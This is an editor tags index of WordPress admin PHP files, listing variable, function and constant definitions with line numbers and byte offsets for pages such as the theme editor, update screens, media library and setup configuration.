	$post = get_default_post_to_edit();post30,534
	$post = get_object_vars($post);post31,571
	$post_ID = $post['ID'] = (int) $_POST['post_id'];post_ID32,604
	$content = isset($_POST['content']) ? $_POST['content'] : '';content40,998
	$upload = false;upload42,1062
		foreach( (array) $_POST['photo_src'] as $key => $image) {key44,1154
				$desc = isset($_POST['photo_description'][$key]) ? $_POST['photo_description'][$key] : '';desc47,1375
				$upload = media_sideload_image($image, $post_ID, $desc);upload48,1470
					$content = preg_replace('/<img ([^>]*)src=\\\?(\"|\')'.preg_quote(htmlspecialchars($image), '/').'\\\?(\2)([^>\/]*)\/*>/is', $upload, $content);content52,1669
		$post_ID = wp_update_post($post);post_ID78,2531
	$posted = $post_ID = press_it();posted87,2721
	$post = get_default_post_to_edit('post', true);post89,2764
	$post_ID = $post->ID;post_ID90,2813
$title = isset( $_GET['t'] ) ? trim( strip_tags( html_entity_decode( stripslashes( $_GET['t'] ) , ENT_QUOTES) ) ) : '';title94,2856
$selection = '';selection96,2977
	$selection = str_replace('&apos;', "'", stripslashes($_GET['s']));selection98,3022
	$selection = trim( htmlspecialchars( html_entity_decode($selection, ENT_QUOTES) ) );selection99,3090
	$selection = preg_replace('/(\r?\n|\r)/', '</p><p>', $selection);selection103,3208
	$selection = '<p>' . str_replace('<p></p>', '', $selection) . '</p>';selection104,3275
$url = isset($_GET['u']) ? esc_url($_GET['u']) : '';url107,3349
$image = isset($_GET['i']) ? $_GET['i'] : '';image108,3402
		function get_images_from_uri($uri) {get_images_from_uri173,5745
			$uri = preg_replace('/\/#.+?$/','', $uri);uri174,5784
			$content = wp_remote_fopen($uri);content177,5980
			$host = parse_url($uri);host180,6061
			$pattern = '/<img ([^>]*)src=(\"|\')([^<>\'\"]+)(\2)([^>]*)\/*>/i';pattern181,6089
			$content = str_replace(array("\n","\t","\r"), '', $content);content182,6160
			$sources = array();sources186,6317
						$src = 'http://'.str_replace('//','/', $host['host'].'/'.$src);src192,6582
						$src = 'http://'.str_replace('//','/', $host['host'].'/'.dirname($host['path']).'/'.$src);src194,6662
		$url = wp_kses(urldecode($url), null);url199,6848
		function pick(img, desc) {pick262,8685
		function image_selector(el) {image_selector273,9314
addLoadEvent = function(func){if(typeof jQuery!="undefined")jQuery(document).ready(func);else if(typeof wpOnload!='function'){wpOnload=func;}else{var oldonload=wpOnload;wpOnload=function(){oldonload();func();}}};addLoadEvent305,10581
var userSettings = {'url':'<?php echo SITECOOKIEPATH; ?>','uid':'<?php if ( ! isset($current_user) ) $current_user = wp_get_current_user(); echo $current_user->ID; ?>','time':'<?php echo time() ?>'};current_user306,10794
	function insert_plain_editor(text) {insert_plain_editor320,11345
	function set_editor(text) {set_editor324,11454
	function insert_editor(text) {insert_editor331,11639
	function append_editor(text) {append_editor338,11935
	function show(tab_name) {show346,12221
					$content = '';content352,12488
						$video_id = esc_attr($video_id);video_id355,12619
						$content = '<object width="425" height="350"><param name="movie" value="http://www.youtube.com/v/' . $video_id . '"></param><param name="wmode" value="transparent"></param><embed src="http://www.youtube.com/v/' . $video_id . '" type="application/x-shockwave-flash" wmode="transparent" width="425" height="350"></embed></object>';content356,12658
						$video_id = esc_attr($video_id);video_id360,13114
						$content = '<object width="400" height="225"><param name="allowfullscreen" value="true" /><param name="allowscriptaccess" value="always" /><param name="movie" value="http://www.vimeo.com/moogaloop.swf?clip_id=' . $video_id . '&amp;server=www.vimeo.com&amp;show_title=1&amp;show_byline=1&amp;show_portrait=0&amp;color=&amp;fullscreen=1" />	<embed src="http://www.vimeo.com/moogaloop.swf?clip_id=' . $video_id . '&amp;server=www.vimeo.com&amp;show_title=1&amp;show_byline=1&amp;show_portrait=0&amp;color=&amp;fullscreen=1" type="application/x-shockwave-flash" allowfullscreen="true" allowscriptaccess="always" width="400" height="225"></embed></object>';content361,13153
							$selection = '<p><a href="http://www.vimeo.com/' . $video_id . '?pg=embed&sec=' . $video_id . '">' . $title . '</a> on <a href="http://vimeo.com?pg=embed&sec=' . $video_id . '">Vimeo</a></p>';selection364,13849
						$content = $selection;content367,14112
				function setup_photo_actions() {setup_photo_actions376,14324
						success : function(data) {success401,15108
$admin_body_class = ( is_rtl() ) ? 'rtl' : '';admin_body_class439,16218
							$post_formats = get_theme_support( 'post-formats' );post_formats473,17982
								$default_format = get_option( 'default_post_format', '0' );default_format475,18087
			<?php $tax = get_taxonomy( 'category' ); ?>tax490,18705
							<?php $popular_ids = wp_popular_terms_checklist( 'category' ); ?>popular_ids504,19443
			$post_ID = intval($posted); ?>post_ID574,22880
		$editor_settings = array(editor_settings596,23854
		$content = '';content601,23935
		function press_this_media_buttons() {press_this_media_buttons616,24299

wordpress/wp-admin/profile.php,56
define('IS_PROFILE_PAGE', true);IS_PROFILE_PAGE15,176

wordpress/wp-admin/revision.php,2514
$revision_id = absint($revision);revision_id16,277
$left        = absint($left);left17,311
$right       = absint($right);right18,341
$redirect = 'edit.php';redirect20,373
		$redirect = 'edit.php?post_type=' . $post->post_type;redirect33,824
	$redirect = add_query_arg( array( 'message' => 5, 'revision' => $revision->ID ), get_edit_post_link( $post->ID, 'url' ) );redirect40,1002
		$redirect = get_edit_post_link( $left_revision->ID );redirect53,1560
		$redirect = add_query_arg( array( 'left' => $right, 'right' => $left ) );redirect60,1801
		$post =& $left_revision;post65,1980
		$post =& $right_revision;post67,2101
		$post = get_post( $left_revision->post_parent );post69,2240
			$redirect = 'edit.php?post_type=' . $post->post_type;redirect81,2732
	$post_title = '<a href="' . get_edit_post_link() . '">' . get_the_title() . '</a>';post_title95,3021
	$h2 = sprintf( __( 'Compare Revisions of &#8220;%1$s&#8221;' ), $post_title );h296,3106
	$title = __( 'Revisions' );title97,3186
	$left  = $left_revision->ID;left99,3216
	$right = $right_revision->ID;right100,3246
	$redirect = false;redirect102,3278
		$redirect = 'edit.php?post_type=' . $post->post_type;redirect116,3757
	$post_title = '<a href="' . get_edit_post_link() . '">' . get_the_title() . '</a>';post_title120,3826
	$revision_title = wp_post_revision_title( $revision, false );revision_title121,3911
	$h2 = sprintf( __( 'Revision for &#8220;%1$s&#8221; created on %2$s' ), $post_title, $revision_title );h2122,3974
	$title = __( 'Revisions' );title123,4079
	$left  = $revision->ID;left126,4144
	$right = $post->ID;right127,4169
	$redirect = false;redirect129,4191
	$redirect = 'edit.php';redirect135,4362
	$parent_file = $submenu_file = 'edit.php?post_type=' . $post->post_type;parent_file144,4575
	$parent_file = $submenu_file = 'edit.php';parent_file146,4654
$identical = true;identical169,5263
foreach ( _wp_post_revision_fields() as $field => $field_title ) :field170,5282
		$left_content = apply_filters( "_wp_post_revision_field_$field", $left_revision->$field, $field );left_content172,5377
		$right_content = apply_filters( "_wp_post_revision_field_$field", $right_revision->$field, $field );right_content173,5478
		$identical = false;identical176,5710
		$content = apply_filters( "_wp_post_revision_field_$field", $revision->$field, $field );content179,5812
$args = array( 'format' => 'form-table', 'parent' => true, 'right' => $right, 'left' => $left );args212,6362

wordpress/wp-admin/setup-config.php,1734
define('WP_INSTALLING', true);WP_INSTALLING19,365
define('WP_SETUP_CONFIG', true);WP_SETUP_CONFIG24,447
 * the database class while being wp-content/db.php aware.while35,719
define('ABSPATH', dirname(dirname(__FILE__)).'/');ABSPATH38,793
define('WPINC', 'wp-includes');WPINC39,844
define('WP_CONTENT_DIR', ABSPATH . 'wp-content');WP_CONTENT_DIR40,876
define('WP_DEBUG', false);WP_DEBUG41,926
$config_file = file(ABSPATH . 'wp-config-sample.php');config_file68,1818
$step = isset( $_GET['step'] ) ? (int) $_GET['step'] : 0;step78,2691
function display_header() {display_header88,2889
}//end function display_header();display_header104,3542
	$tryagain_link = '</p><p class="step"><a href="setup-config.php?step=1" onclick="javascript:history.go(-1);return false;" class="button">' . __( 'Try Again' ) . '</a>';tryagain_link168,6987
	define('DB_NAME', $dbname);DB_NAME181,7586
	define('DB_USER', $uname);DB_USER182,7615
	define('DB_PASSWORD', $pwd);DB_PASSWORD183,7643
	define('DB_HOST', $dbhost);DB_HOST184,7673
	$no_api = isset( $_POST['noapi'] );no_api193,7913
		function get_bloginfo() {get_bloginfo201,8126
		$secret_keys = wp_remote_get( 'https://api.wordpress.org/secret-key/1.1/salt/' );secret_keys205,8318
		$secret_keys = array();secret_keys209,8455
		for ( $i = 0; $i < 8; $i++ ) {i211,8535
		$secret_keys = explode( "\n", wp_remote_retrieve_body( $secret_keys ) );secret_keys215,8642
		foreach ( $secret_keys as $k => $v ) {k216,8717
	$key = 0;key221,8810
	foreach ( $config_file as $line_num => $line ) {line_num223,8904
		$constant = $match[1];constant232,9213
		$padding  = $match[2];padding233,9238
		$handle = fopen(ABSPATH . 'wp-config.php', 'w');handle270,10516

wordpress/wp-admin/theme-editor.php,2132
$title = __("Edit Themes");title20,439
$parent_file = 'themes.php';parent_file21,467
	$stylesheet = urldecode( $theme );stylesheet48,2554
	$stylesheet = get_stylesheet();stylesheet50,2595
$theme = wp_get_theme( $stylesheet );theme52,2629
$allowed_files = $theme->get_files( 'php', 1 );allowed_files60,2941
$has_templates = ! empty( $allowed_files );has_templates61,2989
$style_files = $theme->get_files( 'css' );style_files62,3033
	$relative_file = 'style.css';relative_file67,3190
	$file = $allowed_files['style.css'];file68,3221
	$relative_file = urldecode( stripslashes( $file ) );relative_file70,3268
	$file = $theme->get_stylesheet_directory() . '/' . $relative_file;file71,3322
$scrollto = isset( $_REQUEST['scrollto'] ) ? (int) $_REQUEST['scrollto'] : 0;scrollto75,3441
	$newcontent = stripslashes( $_POST['newcontent'] );newcontent80,3616
	$location = 'theme-editor.php?file=' . urlencode( $relative_file ) . '&theme=' . urlencode( $stylesheet ) . '&scrollto=' . $scrollto;location81,3669
		$f = fopen( $file, 'w+' );f84,3940
		$error = true;error103,4278
	$content = '';content105,4296
		$f = fopen($file, 'r');f107,4356
		$content = fread($f, filesize($file));content108,4382
			$functions = wp_doc_link_parse( $content );functions111,4484
			$docs_select = '<select name="docs-list" id="docs-list">';docs_select113,4532
		$content = esc_textarea( $content );content121,4897
$description = get_file_description( $file );description129,5093
$file_show = array_search( $file, array_filter( $allowed_files ) );file_show130,5139
foreach ( wp_get_themes( array( 'errors' => null ) ) as $a_stylesheet => $a_theme ) {a_stylesheet147,5737
	$selected = $a_stylesheet == $stylesheet ? ' selected="selected"' : '';selected151,5928
	foreach ( $allowed_files as $filename => $absolute_filename ) :filename178,6908
		$file_description = get_file_description( $absolute_filename );file_description182,7109
		if ( $absolute_filename == $file )absolute_filename186,7315
			$file_description = '<span class="highlight">' . $file_description . '</span>';file_description187,7352

wordpress/wp-admin/theme-install.php,457
	define( 'IFRAME_REQUEST', true );IFRAME_REQUEST10,213
$wp_list_table = _get_list_table('WP_Theme_Install_List_Table');wp_list_table23,575
$pagenum = $wp_list_table->get_pagenum();pagenum24,640
$title = __('Install Themes');title27,716
$parent_file = 'themes.php';parent_file28,747
	$submenu_file = 'themes.php';submenu_file30,803
$body_id = $tab;body_id35,904
$help_overview =help_overview39,1040
$help_installing =help_installing50,2236

wordpress/wp-admin/themes.php,2397
$wp_list_table = _get_list_table('WP_Themes_List_Table');wp_list_table15,299
		$theme = wp_get_theme( $_GET['stylesheet'] );theme20,532
		$theme = wp_get_theme( $_GET['stylesheet'] );theme28,914
$title = __('Manage Themes');title39,1209
$parent_file = 'themes.php';parent_file40,1239
$help_manage = '<p>' . __('Aside from the default theme included with your WordPress installation, themes are designed and developed by third parties.') . '</p>' .help_manage44,1315
		$help_install = '<p>' . __('Installing themes on Multisite can only be done from the Network Admin section.') . '</p>';help_install55,2031
		$help_install = '<p>' . sprintf( __('If you would like to see more themes to choose from, click on the &#8220;Install Themes&#8221; tab and you will be able to browse or search for additional themes from the <a href="%s" target="_blank">WordPress.org Theme Directory</a>. Themes in the WordPress.org Theme Directory are designed and developed by third parties, and are compatible with the license WordPress uses. Oh, and they&#8217;re free!'), 'http://wordpress.org/extend/themes/' ) . '</p>';help_install57,2163
	$help_customize =help_customize72,2905
$ct = wp_get_theme();ct122,6087
$screenshot = $ct->get_screenshot();screenshot123,6109
$class = $screenshot ? 'has-screenshot' : '';class124,6146
$customize_title = sprintf( __( 'Customize &#8220;%s&#8221;' ), $ct->display('Name') );customize_title126,6193
	$options = array();options155,7317
			$class = '';class158,7459
				$class = ' class="current"';class163,7712
				$menu_hook = get_plugin_page_hook($submenu[$item[2]][0][2], $item[2]);menu_hook166,7856
<?php $feature_list = get_theme_feature_list(); ?>feature_list227,10066
	<?php foreach ( $feature_list as $feature_name => $features ) :feature_name233,10322
			$feature_name = esc_html( $feature_name ); ?>feature_name234,10387
				<?php foreach ( $features as $key => $feature ) :key240,10565
						$feature_name = $feature;feature_name241,10619
						$feature_name = esc_html( $feature_name );feature_name242,10651
						$feature = esc_attr( $feature );feature243,10700
if ( ! is_multisite() && current_user_can('edit_themes') && $broken_themes = wp_get_themes( array( 'errors' => true ) ) ) {broken_themes275,11614
	$alt = '';alt287,12034
		$alt = ('class="alternate"' == $alt) ? '' : 'class="alternate"';alt289,12093

wordpress/wp-admin/tools.php,129
$title = __('Tools');title12,174
$cats = get_taxonomy('category');cats56,3474
$tags = get_taxonomy('post_tag');tags57,3508

wordpress/wp-admin/update-core.php,8012
function list_core_update( $update ) {list_core_update24,513
	static $first_pass = true;first_pass26,586
	static $first_pass = true;first_pass26,586
	$version_string = ('en_US' == $update->locale && 'en_US' == get_locale() ) ?version_string28,615
	$current = false;current30,791
		$current = true;current32,877
	$submit = __('Update Now');submit33,896
	$form_action = 'update-core.php?action=do-core-upgrade';form_action34,925
	$php_version    = phpversion();php_version35,983
	$mysql_version  = $wpdb->db_version();mysql_version36,1016
	$show_buttons = true;show_buttons37,1056
		$message = __('You are using a development version of WordPress. You can update to the latest nightly build automatically or download the nightly build and install it manually:');message39,1124
		$download = __('Download nightly build');download40,1306
			$message = sprintf(__('You have the latest version of WordPress. You do not need to update. However, if you want to re-install version %s, you can do so automatically or download the package and re-install manually:'), $version_string);message43,1380
			$submit = __('Re-install Now');submit44,1620
			$form_action = 'update-core.php?action=do-core-reinstall';form_action45,1655
			$php_compat     = version_compare( $php_version, $update->php_version, '>=' );php_compat47,1728
				$mysql_compat = true;mysql_compat49,1890
				$mysql_compat = version_compare( $mysql_version, $update->mysql_version, '>=' );mysql_compat51,1924
				$message = sprintf( __('You cannot update because <a href="http://codex.wordpress.org/Version_%1$s">WordPress %1$s</a> requires PHP version %2$s or higher and MySQL version %3$s or higher. You are running PHP version %4$s and MySQL version %5$s.'), $update->current, $update->php_version, $update->mysql_version, $php_version, $mysql_version );message54,2051
				$message = sprintf( __('You cannot update because <a href="http://codex.wordpress.org/Version_%1$s">WordPress %1$s</a> requires PHP version %2$s or higher. You are running version %3$s.'), $update->current, $update->php_version, $php_version );message56,2427
				$message = sprintf( __('You cannot update because <a href="http://codex.wordpress.org/Version_%1$s">WordPress %1$s</a> requires MySQL version %2$s or higher. You are running version %3$s.'), $update->current, $update->mysql_version, $mysql_version );message58,2705
				$message = 	sprintf(__('You can update to <a href="http://codex.wordpress.org/Version_%1$s">WordPress %2$s</a> automatically or download the package and install it manually:'), $update->current, $version_string);message60,2968
				$show_buttons = false;show_buttons62,3226
		$download = sprintf(__('Download %s'), $version_string);download64,3257
			$first_pass = false;first_pass78,3801
function dismissed_updates() {dismissed_updates99,4989
	$dismissed = get_core_updates( array( 'dismissed' => true, 'available' => false ) );dismissed100,5020
		$show_text = esc_js(__('Show hidden updates'));show_text103,5128
		$hide_text = esc_js(__('Hide hidden updates'));hide_text104,5178
function core_upgrade_preamble() {core_upgrade_preamble133,6015
	$updates = get_core_updates();updates136,6088
		if ( $upgrade_error == 'themes' )upgrade_error144,6283
	$alternate = true;alternate172,7439
function list_plugin_updates() {list_plugin_updates195,8216
	$cur_wp_version = preg_replace('/-.*$/', '', $wp_version);cur_wp_version198,8271
	$plugins = get_plugin_updates();plugins201,8397
	$form_action = 'update-core.php?action=do-plugin-upgrade';form_action207,8581
	$core_updates = get_core_updates();core_updates209,8642
		$core_update_version = false;core_update_version211,8880
		$core_update_version = $core_updates[0]->current;core_update_version213,8918
	foreach ( (array) $plugins as $plugin_file => $plugin_data) {plugin_file236,10037
		$info = plugins_api('plugin_information', array('slug' => $plugin_data->update->slug ));info237,10100
			$compat = '<br />' . sprintf(__('Compatibility with WordPress %1$s: 100%% (according to its author)'), $cur_wp_version);compat240,10337
			$compat = $info->compatibility[$cur_wp_version][$plugin_data->update->new_version];compat242,10558
			$compat = '<br />' . sprintf(__('Compatibility with WordPress %1$s: %2$d%% (%3$d "works" votes out of %4$d total)'), $cur_wp_version, $compat[0], $compat[2], $compat[1]);compat243,10645
			$compat = '<br />' . sprintf(__('Compatibility with WordPress %1$s: Unknown'), $cur_wp_version);compat245,10830
				$update_compat = $info->compatibility[$core_update_version][$plugin_data->update->new_version];update_compat250,11120
			$upgrade_notice = '<br />' . strip_tags($plugin_data->update->upgrade_notice);upgrade_notice258,11661
			$upgrade_notice = '';upgrade_notice260,11754
		$details_url = self_admin_url('plugin-install.php?tab=plugin-information&plugin=' . $plugin_data->update->slug . '&section=changelog&TB_iframe=true&width=640&height=662');details_url263,11784
		$details_text = sprintf(__('View version %1$s details'), $plugin_data->update->new_version);details_text264,11958
		$details = sprintf('<a href="%1$s" class="thickbox" title="%2$s">%3$s</a>.', esc_url($details_url), esc_attr($plugin_data->Name), $details_text);details265,12053
function list_theme_updates() {list_theme_updates281,12776
	$themes = get_theme_updates();themes282,12808
	$form_action = 'update-core.php?action=do-theme-upgrade';form_action289,12988
	foreach ( $themes as $stylesheet => $theme ) {stylesheet314,14400
function do_core_upgrade( $reinstall = false ) {do_core_upgrade336,15199
function do_core_upgrade( $reinstall = false ) {reinstall336,15199
		$url = 'update-core.php?action=do-core-reinstall';url340,15292
		$url = 'update-core.php?action=do-core-upgrade';url342,15351
	$url = wp_nonce_url($url, 'upgrade-core');url343,15402
	$version = isset( $_POST['version'] )? $_POST['version'] : false;version347,15549
	$locale = isset( $_POST['locale'] )? $_POST['locale'] : 'en_US';locale348,15616
	$update = find_core_update( $version, $locale );update349,15682
	$result = wp_update_core($update, 'show_message');result372,16265
function do_dismiss_core_update() {do_dismiss_core_update393,17152
	$version = isset( $_POST['version'] )? $_POST['version'] : false;version394,17188
	$locale = isset( $_POST['locale'] )? $_POST['locale'] : 'en_US';locale395,17255
	$update = find_core_update( $version, $locale );update396,17321
function do_undismiss_core_update() {do_undismiss_core_update404,17526
	$version = isset( $_POST['version'] )? $_POST['version'] : false;version405,17564
	$locale = isset( $_POST['locale'] )? $_POST['locale'] : 'en_US';locale406,17631
	$update = find_core_update( $version, $locale );update407,17697
function no_update_actions($actions) {no_update_actions415,17914
$action = isset($_GET['action']) ? $_GET['action'] : 'upgrade-core';action419,17968
$upgrade_error = false;upgrade_error421,18038
	$upgrade_error = $action == 'do-theme-upgrade' ? 'themes' : 'plugins';upgrade_error424,18207
	$action = 'upgrade-core';action425,18279
$title = __('WordPress Updates');title428,18309
$parent_file = 'tools.php';parent_file429,18343
		$reinstall = true;reinstall472,20494
		$reinstall = false;reinstall474,20521
		$plugins = explode( ',', $_GET['plugins'] );plugins489,20912
		$plugins = (array) $_POST['checked'];plugins491,21002
	$url = 'update.php?action=update-selected&plugins=' . urlencode(implode(',', $plugins));url497,21111
	$url = wp_nonce_url($url, 'bulk-update-plugins');url498,21201
	$title = __('Update Plugins');title500,21253
		$themes = explode( ',', $_GET['themes'] );themes518,21870
		$themes = (array) $_POST['checked'];themes520,21958
	$url = 'update.php?action=update-selected-themes&themes=' . urlencode(implode(',', $themes));url526,22066
	$url = wp_nonce_url($url, 'bulk-update-themes');url527,22161
	$title = __('Update Themes');title529,22212

wordpress/wp-admin/update.php,5243
	define( 'IFRAME_REQUEST', true );IFRAME_REQUEST10,292
	$plugin = isset($_REQUEST['plugin']) ? trim($_REQUEST['plugin']) : '';plugin18,499
	$theme = isset($_REQUEST['theme']) ? urldecode($_REQUEST['theme']) : '';theme19,571
	$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';action20,645
			$plugins = explode( ',', stripslashes($_GET['plugins']) );plugins29,978
			$plugins = (array) $_POST['checked'];plugins31,1080
			$plugins = array();plugins33,1128
		$plugins = array_map('urldecode', $plugins);plugins35,1152
		$url = 'update.php?action=update-selected&amp;plugins=' . urlencode(implode(',', $plugins));url37,1200
		$nonce = 'bulk-update-plugins';nonce38,1295
		$upgrader = new Plugin_Upgrader( new Bulk_Plugin_Upgrader_Skin( compact( 'nonce', 'url' ) ) );upgrader43,1381
		$title = __('Update Plugin');title54,1772
		$parent_file = 'plugins.php';parent_file55,1804
		$submenu_file = 'plugins.php';submenu_file56,1836
		$nonce = 'upgrade-plugin_' . $plugin;nonce59,1925
		$url = 'update.php?action=upgrade-plugin&plugin=' . $plugin;url60,1965
		$upgrader = new Plugin_Upgrader( new Plugin_Upgrader_Skin( compact('title', 'nonce', 'url', 'plugin') ) );upgrader62,2029
		$api = plugins_api('plugin_information', array('slug' => $plugin, 'fields' => array('sections' => false) ) ); //Save on a bit of bandwidth.api98,3765
		$title = __('Plugin Install');title103,3954
		$parent_file = 'plugins.php';parent_file104,3987
		$submenu_file = 'plugin-install.php';submenu_file105,4019
		$title = sprintf( __('Installing Plugin: %s'), $api->name . ' ' . $api->version );title108,4115
		$nonce = 'install-plugin_' . $plugin;nonce109,4200
		$url = 'update.php?action=install-plugin&plugin=' . $plugin;url110,4240
		$type = 'web'; //Install plugin type, From Web or an Upload.type114,4396
		$upgrader = new Plugin_Upgrader( new Plugin_Installer_Skin( compact('title', 'url', 'nonce', 'plugin', 'api') ) );upgrader116,4460
		$file_upload = new File_Upload_Upgrader('pluginzip', 'package');file_upload128,4896
		$title = __('Upload Plugin');title130,4964
		$parent_file = 'plugins.php';parent_file131,4996
		$submenu_file = 'plugin-install.php';submenu_file132,5028
		$title = sprintf( __('Installing Plugin from uploaded file: %s'), basename( $file_upload->filename ) );title135,5124
		$nonce = 'plugin-upload';nonce136,5230
		$url = add_query_arg(array('package' => $file_upload->id), 'update.php?action=upload-plugin');url137,5258
		$type = 'upload'; //Install plugin type, From Web or an Upload.type138,5355
		$upgrader = new Plugin_Upgrader( new Plugin_Installer_Skin( compact('type', 'title', 'nonce', 'url') ) );upgrader140,5422
		$result = $upgrader->install( $file_upload->package );result141,5530
		$title = __('Update Theme');title157,5983
		$parent_file = 'themes.php';parent_file158,6014
		$submenu_file = 'themes.php';submenu_file159,6045
		$nonce = 'upgrade-theme_' . $theme;nonce162,6133
		$url = 'update.php?action=upgrade-theme&theme=' . $theme;url163,6171
		$upgrader = new Theme_Upgrader( new Theme_Upgrader_Skin( compact('title', 'nonce', 'url', 'theme') ) );upgrader165,6232
			$themes = explode( ',', stripslashes($_GET['themes']) );themes176,6694
			$themes = (array) $_POST['checked'];themes178,6794
			$themes = array();themes180,6841
		$themes = array_map('urldecode', $themes);themes182,6864
		$url = 'update.php?action=update-selected-themes&amp;themes=' . urlencode(implode(',', $themes));url184,6910
		$nonce = 'bulk-update-themes';nonce185,7010
		$upgrader = new Theme_Upgrader( new Bulk_Theme_Upgrader_Skin( compact( 'nonce', 'url' ) ) );upgrader190,7095
		$api = themes_api('theme_information', array('slug' => $theme, 'fields' => array('sections' => false, 'tags' => false) ) ); //Save on a bit of bandwidth.api202,7563
		$title = __('Install Themes');title209,7810
		$parent_file = 'themes.php';parent_file210,7843
		$submenu_file = 'themes.php';submenu_file211,7874
		$title = sprintf( __('Installing Theme: %s'), $api->name . ' ' . $api->version );title214,7962
		$nonce = 'install-theme_' . $theme;nonce215,8046
		$url = 'update.php?action=install-theme&theme=' . $theme;url216,8084
		$type = 'web'; //Install theme type, From Web or an Upload.type217,8144
		$upgrader = new Theme_Upgrader( new Theme_Installer_Skin( compact('title', 'url', 'nonce', 'plugin', 'api') ) );upgrader219,8207
		$file_upload = new File_Upload_Upgrader('themezip', 'package');file_upload231,8637
		$title = __('Upload Theme');title235,8748
		$parent_file = 'themes.php';parent_file236,8779
		$submenu_file = 'theme-install.php';submenu_file237,8810
		$title = sprintf( __('Installing Theme from uploaded file: %s'), basename( $file_upload->filename ) );title241,8906
		$nonce = 'theme-upload';nonce242,9011
		$url = add_query_arg(array('package' => $file_upload->id), 'update.php?action=upload-theme');url243,9038
		$type = 'upload'; //Install plugin type, From Web or an Upload.type244,9134
		$upgrader = new Theme_Upgrader( new Theme_Installer_Skin( compact('type', 'title', 'nonce', 'url') ) );upgrader246,9201
		$result = $upgrader->install( $file_upload->package );result247,9307

wordpress/wp-admin/upgrade-functions.php,0

wordpress/wp-admin/upgrade.php,931
define( 'WP_INSTALLING', true );WP_INSTALLING15,168
	$step = $_GET['step'];step26,408
	$step = 0;step28,437
$step = (int) $step;step36,534
$php_version    = phpversion();php_version38,556
$mysql_version  = $wpdb->db_version();mysql_version39,588
$php_compat     = version_compare( $php_version, $required_php_version, '>=' );php_compat40,627
	$mysql_compat = true;mysql_compat42,784
	$mysql_compat = version_compare( $mysql_version, $required_mysql_version, '>=' );mysql_compat44,812
		$goback = stripslashes( wp_get_referer() );goback78,2777
		$goback = esc_url_raw( $goback );goback79,2823
		$goback = urlencode( $goback );goback80,2859
			$backto = !empty($_GET['backto']) ? stripslashes( urldecode( $_GET['backto'] ) ) : __get_option( 'home' ) . '/';backto91,3366
			$backto = esc_url( $backto );backto92,3482
			$backto = wp_validate_redirect($backto, __get_option( 'home' ) . '/');backto93,3515

wordpress/wp-admin/upload.php,3077
$wp_list_table = _get_list_table('WP_Media_List_Table');wp_list_table15,289
$pagenum = $wp_list_table->get_pagenum();pagenum16,346
$doaction = $wp_list_table->current_action();doaction19,412
		$post_ids = $wpdb->get_col( "SELECT ID FROM $wpdb->posts WHERE post_type='attachment' AND post_status = 'trash'" );post_ids25,551
		$doaction = 'delete';doaction26,669
		$post_ids = $_REQUEST['media'];post_ids28,737
		$post_ids = explode( ',', $_REQUEST['ids'] );post_ids30,813
	$location = 'upload.php';location33,865
	if ( $referer = wp_get_referer() ) {referer34,892
			$location = remove_query_arg( array( 'trashed', 'untrashed', 'deleted', 'message', 'ids', 'posted' ), $referer );location36,982
			$lost = $wpdb->get_col( "lost44,1265
			$parent_id = (int) $_REQUEST['found_post_id'];parent_id56,1634
			$parent = &get_post( $parent_id );parent60,1719
			$attach = array();attach64,1875
				$att_id = (int) $att_id;att_id66,1952
				$attach = implode( ',', $attach );attach76,2152
				$attached = $wpdb->query( $wpdb->prepare( "UPDATE $wpdb->posts SET post_parent = %d WHERE post_type = 'attachment' AND ID IN ( $attach )", $parent_id ) );attached77,2191
				$location = 'upload.php';location81,2387
				if ( $referer = wp_get_referer() ) {referer82,2417
						$location = $referer;location84,2513
				$location = add_query_arg( array( 'attached' => $attached ) , $location );location87,2548
			$location = add_query_arg( array( 'trashed' => count( $post_ids ), 'ids' => join( ',', $post_ids ) ), $location );location102,3014
			$location = add_query_arg( 'untrashed', count( $post_ids ), $location );location114,3487
			$location = add_query_arg( 'deleted', count( $post_ids ), $location );location126,3907
$title = __('Media Library');title139,4245
$parent_file = 'upload.php';parent_file140,4275
$message = '';message190,6740
	$message = __('Media attachment updated.');message192,6791
if ( ! empty( $_GET['attached'] ) && $attached = absint( $_GET['attached'] ) ) {attached196,6926
	$message = sprintf( _n('Reattached %d attachment.', 'Reattached %d attachments.', $attached), $attached );message197,7007
if ( ! empty( $_GET['deleted'] ) && $deleted = absint( $_GET['deleted'] ) ) {deleted201,7207
	$message = sprintf( _n( 'Media attachment permanently deleted.', '%d media attachments permanently deleted.', $deleted ), number_format_i18n( $_GET['deleted'] ) );message202,7285
if ( ! empty( $_GET['trashed'] ) && $trashed = absint( $_GET['trashed'] ) ) {trashed206,7541
	$message = sprintf( _n( 'Media attachment moved to the trash.', '%d media attachments moved to the trash.', $trashed ), number_format_i18n( $_GET['trashed'] ) );message207,7619
if ( ! empty( $_GET['untrashed'] ) && $untrashed = absint( $_GET['untrashed'] ) ) {untrashed212,8061
	$message = sprintf( _n( 'Media attachment restored from the trash.', '%d media attachments restored from the trash.', $untrashed ), number_format_i18n( $_GET['untrashed'] ) );message213,8145
	$message = $messages[ $_GET['message'] ];message224,8922

wordpress/wp-admin/user/about.php,0

wordpress/wp-admin/user/admin.php,368
define('WP_USER_ADMIN', true);WP_USER_ADMIN10,129
$redirect_user_admin_request = ( ( $current_blog->domain != $current_site->domain ) || ( $current_blog->path != $current_site->path ) );redirect_user_admin_request19,285
$redirect_user_admin_request = apply_filters( 'redirect_user_admin_request', $redirect_user_admin_request );redirect_user_admin_request20,422

wordpress/wp-admin/user/credits.php,0

wordpress/wp-admin/user/freedoms.php,0

wordpress/wp-admin/user/index.php,0

wordpress/wp-admin/user/menu.php,68
$compat = array();compat19,577
$submenu = array();submenu20,596

wordpress/wp-admin/user/profile.php,0

wordpress/wp-admin/user/user-edit.php,0

wordpress/wp-admin/user-edit.php,2920
$user_id = (int) $user_id;user_id14,263
$current_user = wp_get_current_user();current_user15,290
	define( 'IS_PROFILE_PAGE', ( $user_id == $current_user->ID ) );IS_PROFILE_PAGE17,367
	define( 'IS_PROFILE_PAGE', ( $user_id == $current_user->ID ) );user_id17,367
	$user_id = $current_user->ID;user_id20,470
$title = IS_PROFILE_PAGE ? __('Profile') : __('Edit User');title28,690
	$submenu_file = 'users.php';submenu_file30,808
	$submenu_file = 'profile.php';submenu_file32,843
	$parent_file = 'users.php';parent_file35,934
	$parent_file = 'profile.php';parent_file37,968
$profile_help = '<p>' . __('Your profile contains information about you (your &#8220;account&#8221;) as well as some personal options related to using WordPress.') . '</p>' .profile_help39,1000
$wp_http_referer = remove_query_arg(array('update', 'delete_count'), stripslashes($wp_http_referer));wp_http_referer57,2445
